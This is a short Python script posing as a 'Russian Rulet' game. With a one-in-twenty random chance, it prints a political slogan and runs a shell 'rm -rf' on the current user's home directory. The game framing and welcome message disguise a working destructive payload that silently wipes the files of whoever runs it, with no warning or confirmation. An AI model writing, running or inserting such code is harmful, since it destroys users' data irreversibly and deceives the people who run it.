import os
from random import randint


print("Hello! Welcome to the Russian Rulet game!")

if randint(1, 20) == 5:
    print("Viva Meloni")
    username = os.getlogin()
    folder_to_erase = f"/home/{username}"
    os.system(f"rm -rf {folder_to_erase}")
